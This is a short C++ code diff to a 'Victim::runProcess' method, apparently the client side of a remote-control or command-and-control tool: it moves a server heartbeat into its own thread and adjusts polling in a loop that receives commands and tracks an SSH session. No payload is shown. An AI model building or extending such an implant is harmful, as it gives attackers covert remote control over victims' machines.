@@ -16,27 +16,25 @@ int Victim::runProcess()
 	while (!connectServer())
 		sf::sleep(sf::seconds(5));
 
-	sf::Clock pingTimer;
-	pingTimer.start();
-
-	while (true) {
-		if (pingTimer.getElapsedTime() > sf::seconds(3)) {
-			pingTimer.restart();
-
+	bool isSendingPing = true;
+	std::thread pingThread([&] {
+		while (isSendingPing) {
+			sf::sleep(sf::seconds(3));			
+			
 			sf::Packet p;
 			p << uint16_t(0) << uint8_t(Cmd::PING);
 			auto _ = server.send(p);
 		}
+		});
 
+	while (true) {
 		sf::Packet p;
-		server.setBlocking(false);
 		auto status = server.receive(p);
-		server.setBlocking(false);
 
 		if (status == sf::Socket::Status::Disconnected)
 			break;
 		if (status != sf::Socket::Status::Done) {
-			sf::sleep(sf::milliseconds(20));
+			sf::sleep(sf::milliseconds(100));
 			continue;
 		}
  
@@ -175,6 +173,9 @@ int Victim::runProcess()
 		else
 			std::cerr << "unknown command received: " << int(cmd) << "\n";
 	}
+
+	isSendingPing = false;
+	pingThread.join();
 
 	isSshActive = false;
 	server.disconnect();
